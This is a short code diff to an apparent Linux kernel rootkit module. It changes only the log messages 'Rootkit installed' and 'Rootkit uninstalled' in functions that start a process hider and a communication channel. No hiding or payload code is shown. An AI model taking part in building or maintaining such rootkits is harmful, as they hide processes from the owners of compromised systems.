@@ -45,7 +45,7 @@ static int __init main_init(void) {
 	error = processHider_init();
 	if (error) return error;
 
-	printInfo(KERN_INFO "Rootkit installed\n");
+	printInfo("Rootkit installed\n");
 	return 0;
 }
 
@@ -62,7 +62,7 @@ static void __exit main_exit(void) {
 
 	communication_exit();
 
-	printInfo(KERN_INFO "Rootkit uninstalled\n");
+	printInfo("Rootkit uninstalled\n");
 }
 
 
